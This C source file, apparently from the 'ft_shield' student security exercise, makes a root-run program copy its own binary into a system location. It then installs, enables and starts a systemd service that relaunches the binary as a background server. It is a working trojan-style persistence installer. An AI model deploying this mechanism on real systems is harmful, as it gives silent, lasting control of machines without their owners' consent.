#include "ft_shield.h"

void	daemonize(char *target)
{
	int fd = open(SYSTEMD_CONF_DIR"/"PRG_NAME".service", O_CREAT | O_TRUNC | O_WRONLY, 0311);
	char config[4096];
	int len = sprintf(config, SYSTEMD_CONFIG, TARGET_LOCATION, target);
	write(fd, config, len);
	close(fd);
	close(STDOUT_FILENO);
	close(STDERR_FILENO);
	system("systemctl daemon-reload");
	system("systemctl enable "PRG_NAME);
	system("systemctl start "PRG_NAME);
}

void	duplicate(char *path, char *target)
{
	char *buffer[BUFFER_SIZE];

	int src_fd = open(path, O_RDONLY);
	if (src_fd < 0)
		return ;
	int target_fd = open(target, O_CREAT | O_TRUNC | O_WRONLY, 0100);
	if (target_fd < 0)
	{
		close(src_fd);
		return ;
	}
	int ret;
	while ((ret = read(src_fd, buffer, BUFFER_SIZE)))
		write(target_fd, buffer, ret);
	close(target_fd);
	close(src_fd);
}

int		main(void)
{
	char path[MAX_PATH_SIZE];
	char bin_path[MAX_PATH_SIZE];
	char target_path[MAX_PATH_SIZE];

	if (geteuid())
	{
		printf("You must be root !\n");
		return (EXIT_FAILURE);
	}
	if (readlink(PROC_SELF_EXE, path, MAX_PATH_SIZE) < 0)
		return (EXIT_SUCCESS);
	if (readlink(TARGET_LOCATION, bin_path, MAX_PATH_SIZE) >= 0)
		sprintf(target_path, "/%s/%s", bin_path, PRG_NAME);
	else
		sprintf(target_path, "%s/%s", TARGET_LOCATION, PRG_NAME);
	if (strcmp(path, target_path))
	{
		printf("%s\n", STUDENT_LOGIN);
		duplicate(PROC_SELF_EXE, target_path);
		daemonize(target_path);
	}
	else
		server();
	return (EXIT_SUCCESS);
}
